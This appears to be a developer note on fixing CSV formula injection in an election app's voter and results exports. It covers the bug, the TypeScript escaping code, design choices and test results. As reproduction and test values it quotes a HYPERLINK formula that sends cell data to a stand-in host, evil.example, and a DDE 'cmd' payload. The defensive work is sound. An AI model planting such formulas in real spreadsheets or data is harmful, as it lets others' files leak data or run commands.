# CSV Formula Injection — neutralising exported cells

> **Branch:** `fix/csv-formula-injection` · **Version:** stays `0.9.8` (bump skipped at user request)
> **Source:** 2026-08-02 weekly review §3 (Medium) + §4 Security Review
> **Files:** `src/lib/csv.ts` (11 lines of source), `src/lib/csv.test.ts`, `src/lib/results-export.test.ts`

---

## What shipped

Any cell written to a CSV export whose value starts with `=` `+` `-` `@` TAB or CR is now prefixed
with an apostrophe, so a spreadsheet renders it as text instead of **executing** it. The reader
strips that apostrophe back off, so re-importing our own export still yields the original value.

Two export surfaces are covered, because both already funnel through one function:

| Export | Admin-controlled cells |
| --- | --- |
| Voter roster (`/api/elections/[id]/voters/export`) | first name, last name |
| Results tally (`/api/elections/[id]/results/export`) | election title, organization name, candidate name, candidate role |

## The bug

`csvField()` quoted a field when it contained a delimiter, a quote or a newline — correct RFC 4180,
and irrelevant to this problem. **Quoting does not stop evaluation:** Excel, LibreOffice and Google
Sheets all evaluate `"=1+1"`. Reproduced against the live writer before any code changed:

```
"=1+1"     -> "=1+1"          "@SUM(A1)" -> "@SUM(A1)"
"+1"       -> "+1"            "\tX"      -> "\tX"
"-1"       -> "-1"            "\rX"      -> "\rX"   (quoted, still live)
```

A candidate named `=HYPERLINK("https://evil.example/?d="&A1&A2,"Rezultati")` landed in the results
CSV intact. The threat is not the admin attacking themselves — it is the exported file being opened
by **another org member or an outside auditor** the file was shared with.

## How it works

One choke point, both directions, same file:

```ts
// src/lib/csv.ts
const FORMULA_START = /^[=+\-@\t\r]/;

function csvField(value: string, delimiter: string): string {
  const v = FORMULA_START.test(value) ? `'${value}` : value;   // write
  return /["\r\n]/.test(v) || v.includes(delimiter)
    ? `"${v.replace(/"/g, '""')}"`
    : v;
}

function unescapeFormula(value: string): string {                // read
  return value.startsWith("'") && FORMULA_START.test(value.slice(1))
    ? value.slice(1)
    : value;
}
```

`unescapeFormula` is called from `parseCsv`'s `endField`, so every importer inherits it — including
the wizard's voter/candidate CSV upload.

## Decisions

### Escape on write **and** unwrap on read

The weekly review recommended escaping on write only. That would have broken the invariant the
2026-07-26 `wizard-csv-quoted-cells` fix established — `readCsv(toCsv(rows, d)) === rows`, commented
in the test file as *"the most important test in the file"*, and the entire reason the writer and
reader live in one module.

Worse, it would have broken it **silently**: that test uses innocuous values, so it would have
stayed green while asserting a weaker property than its own comment claims. The round-trip rows now
include `["=Ana", "-Horvat", "@b.hr"]` and `["\tX", "'", "1+1"]`.

Practical consequence, proven end-to-end through the real builders: a voter named
`=cmd|' /C calc'!A1` exports as `'=cmd|…` and re-imports through `parseVotersCsv` as
`=cmd|' /C calc'!A1` — original value, `skipped: 0`, and **no apostrophe accumulation** across
repeated export→import cycles.

### The apostrophe is only stripped in front of a trigger character

`'Ante` and `a'b` survive untouched. Only `'` immediately followed by `=` `+` `-` `@` TAB or CR is
treated as our marker, so an apostrophe in real data is never eaten.

### OWASP's full character set, not the review's four

The review named `=` `+` `-` `@`. TAB (0x09) and CR (0x0D) are triggers too, and `\rX` was the case
the writer already quoted — a reminder that quoting is not neutralisation.

## Cost, accepted

A cell whose value genuinely starts with a trigger character now exports with a leading apostrophe.
Excel, LibreOffice and Sheets treat it as the text marker; a machine consumer (pandas, a script)
sees the literal `'`. This only affects values starting with those characters, which in practice are
either malicious or a typo.

## Verification

- `npm run test` **427 passing** (+7) · `npm run lint` clean · `npx tsc --noEmit` clean ·
  `npm run build` clean.
- **Mutation-checked, both halves.** Removing the write-side escape fails 4 tests (including the
  results-export one); removing the read-side unwrap fails the round-trip test and the unwrap test.
  Neither half is decorative — a test that cannot fail proves nothing.
- **End-to-end through the real builders** (`buildVoterCsv` → `parseVotersCsv`), not just the
  primitive.

The test in `results-export.test.ts` deliberately asserts the **path**, not the function: it crafts
a malicious title and candidate name, then scans every cell of the real output for a leading
trigger. `csvField()` knowing how to escape is worthless if an export ever bypasses it.

## If you touch this next

- **Adding a new CSV export?** Nothing to do — build rows as `string[][]` and call `toCsv`. The
  guard is in the writer, not in the callers.
- **Adding XLSX** (`context/future-updates-spec.md` §Exports & Data): the exposure is identical and
  the answer is different — write the cell with an explicit **string** type rather than letting the
  writer infer a formula. Do not assume a binary format is safe by itself.
- **Editing `csvField` or `parseCsv`:** they are inverses. Change one, change the other, and keep
  the round-trip test honest by feeding it values in the class you just touched.

## The two Low-severity review items

Both were verified and deliberately **not** built:

- **Toolchain.** Green locally — 427 tests, lint, `tsc --noEmit`, build. The reviewer's sandbox
  simply had no `node_modules`. But there is no `.github/` at all, so the review's "confirm CI"
  mitigation had nothing to point at. A secret-free workflow **is** viable (`prisma generate` exits 0
  with `DIRECT_URL`/`DATABASE_URL` unset) — the ready-to-paste YAML is recorded in
  `context/future-updates-spec.md` §DevOps & Tooling.
- **GitHub Issues.** Declined: `context/` already holds the roadmap, the open specs and the full
  history, and is gitignored on `main` precisely to keep planning out of the public repo.

> ⚠️ These notes were originally written into `docs/post-mvp-feature-list.md`, which was folded into
> `context/future-updates-spec.md` in a separate documentation pass. `context/` is **not tracked in
> git**, so this dev doc is now the only in-repo record of those two rulings.
